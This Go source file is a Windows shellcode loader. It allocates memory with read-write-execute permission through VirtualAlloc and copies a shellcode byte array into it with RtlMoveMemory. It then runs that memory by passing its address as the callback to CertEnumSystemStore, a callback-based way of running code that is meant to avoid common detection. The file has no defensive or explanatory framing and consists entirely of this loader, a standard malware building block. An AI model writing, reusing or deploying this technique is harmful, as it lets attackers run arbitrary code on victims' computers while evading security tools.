import (
  "golang.org/x/sys/windows"
  "syscall"
  "unsafe"
)

const (
  MEM_COMMIT             = 0x1000
  MEM_RESERVE            = 0x2000
  PAGE_EXECUTE_READWRITE = 0x40
)

var (
  kernel32            = syscall.MustLoadDLL("kernel32.dll")
  ntdll               = syscall.MustLoadDLL("ntdll.dll")
  Crypt32             = syscall.MustLoadDLL("Crypt32.dll")
  VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
  RtlMoveMemory       = ntdll.MustFindProc("RtlMoveMemory")
  CertEnumSystemStore = Crypt32.MustFindProc("CertEnumSystemStore")
)

func Callback(shellcode []byte) {
  addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
  if err != nil && err.Error() != "The operation completed successfully." {
    syscall.Exit(0)
  }
  RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
  CertEnumSystemStore.Call(windows.CERT_SYSTEM_STORE_CURRENT_USER, 0, 0, addr)

}